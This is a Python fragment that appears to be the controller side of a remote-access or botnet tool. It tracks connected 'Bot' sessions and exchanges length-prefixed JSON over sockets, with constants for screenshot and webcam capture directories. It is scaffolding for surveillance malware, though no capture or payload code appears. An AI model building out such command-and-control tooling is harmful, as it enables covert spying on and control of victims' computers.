import json
import hashlib
import os
import socket
import ssl
import sys
import time
import threading
from datetime import datetime
import logging

# Constants
SCREENSHOT_DIR = 'images/screenshots'
WEBCAM_DIR = './images/webcam'
IMAGE_CHUNK_SIZE = 10485760 #10MB
SCREENSHOT_TIMEOUT = 10 # seconds
WEBCAM_TIMEOUT = 10 # seconds

heartbeat_timeout = 10  # seconds

ENCODING = 'utf-8'

class Bot:
    botList = {}
    botCount = 0
    
    def __init__(self, target, ip):
        self.target = target
        self.ip = ip
        self.alias = f"Agent_{Bot.botCount}"
        self.id = Bot.botCount
        self.connected_time = datetime.now()
        self.hostname = "Unknown"
        self.last_seen = datetime.now()
        Bot.botList[self.id] = self
        Bot.botCount += 1
        logging.info(f"Bot initialized - ID: {self.id} | IP: {self.ip} | Connected at: {self.connected_time}")

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            length = len(json_data)
            length_header = f"{length:<10}".encode()
            self.target.send(length_header)
            self.target.send(json_data.encode())
            return True
        except Exception as e:
            logging.error(f"Error sending data to Session {self.id}: {e}")
            return False

    def reliable_recv(self):
        try:
            length_header = self.target.recv(10).decode().strip()
            if not length_header:
                return None
            
            length = int(length_header)
            chunks = []
            bytes_received = 0
            while bytes_received < length:
                chunk = self.target.recv(min(length - bytes_received, 4096))
                if not chunk:
                    return None
                chunks.append(chunk)
                bytes_received += len(chunk)
            
            data = b''.join(chunks).decode()
            return json.loads(data)
            
        except Exception as e:
            logging.error(f"Error receiving data from Session {self.id}: {e}")
            return None

    def update_last_seen(self):
        self.last_seen = datetime.now()
        logging.debug(f"Updated last seen for Session {self.id}")